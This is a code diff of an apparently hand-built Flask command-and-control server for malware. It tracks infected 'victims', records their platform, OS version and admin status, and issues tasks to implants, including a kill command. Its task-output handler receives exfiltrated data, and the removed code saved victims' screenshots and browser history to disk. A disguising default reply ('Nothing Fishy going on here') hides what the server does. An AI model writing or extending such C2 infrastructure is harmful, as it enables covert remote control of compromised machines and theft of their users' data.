@@ -1,6 +1,7 @@
 from flask import Flask,request
 from pathlib import Path
 from lib.database import Database
+from lib.module import Module
 from lib.task import Task
 from lib.victim import Victim
 import  os
@@ -54,17 +55,24 @@ def main(db_object,server_logger):
 			if victim_id:
 				if victim_id in Victim.victims.keys():
 					victim_obj = Victim.victims[victim_id]
-					victim_obj.update_last_seen_to_db()
+					victim_obj.update_last_seen_status_to_db()
 					server_logger.info_log(f"Updated last seen of {victim_obj.victim_id}")
 
 			task = Task.find_unissued_task(victim_id)
 
 			## If there is any task
 			if task:
-				task_obj = Task.load_task(task)
-				task_dict = task_obj.issue_dict()
-				server_logger.info_log(f"Task issued - {task_dict}")
-				return task_dict
+				if task['command'] == 'kill':
+
+					## Kill the victim by sending 'Die' and also update db
+					Victim.victims[victim_id].status = 'Dead'
+					Victim.victims[victim_id].update_last_seen_status_to_db()
+					return 'Die'
+				else:
+					task_obj = Task.load_task(task)
+					task_dict = task_obj.issue_dict()
+					server_logger.info_log(f"Task issued - {task_dict}")
+					return task_dict
 
 			## Default reply of server incase no commands
 			return 'Nothing Fishy going on here :)'
@@ -92,34 +100,10 @@ def main(db_object,server_logger):
 			victim_id = get_cookie(request)
 
 			server_logger.info_log("Recieved task output for task ID - {task_id} , Victim ID - {victim_id} , Command - {cmd}",'green')
-			## Handling for various kind of tasks
-			if cmd == 'screenshot':
+			
+			## Handling for various kind of tasks, also passing the task/module options set by user
+			output = Module.module_task_id[task_id].handle_task_output(request.data,Task.tasks[task_id].options,victim_id,)
 
-				## Dumping path
-				dump_path = os.path.join(os.getcwd(),'victim_data',victim_id)
-				if not os.path.exists(dump_path):
-					os.makedirs(dump_path)
-				ss_path = os.path.join(dump_path,"screenshot_"+time.strftime("%Y%m%d-%H%M%S")+".png")
-
-				## Screenshot is base64 encoded
-				b64encoded_string = request.data
-				decoded_string = base64.b64decode(b64encoded_string)
-				
-
-
-				## Dump the screenshot
-				with open(ss_path, "wb") as f:
-					f.write(decoded_string)
-				f.close()
-
-				output = 'Screeshot saved to '+ss_path
-			elif cmd == 'browser_history':
-
-				## Comes as a bytes object, so changing to string
-				output = request.data.decode('utf-8')
-			else:
-				## Not a valid cmd,, Do something?? TODO
-				pass
 			
 			task_obj = Task.tasks[task_id]
 			task_obj.insert_cmd_output(output)
@@ -148,7 +132,7 @@ def main(db_object,server_logger):
 
 			if victim_id:
 				## instantiate a new victim object
-				victim_obj = Victim(victim_id = victim_id,platform = info['platform'],os_version = info['version'])
+				victim_obj = Victim(victim_id = victim_id,platform = info['platform'],os_version = info['version'],admin = info['admin'])
 
 
 				if victim_obj:
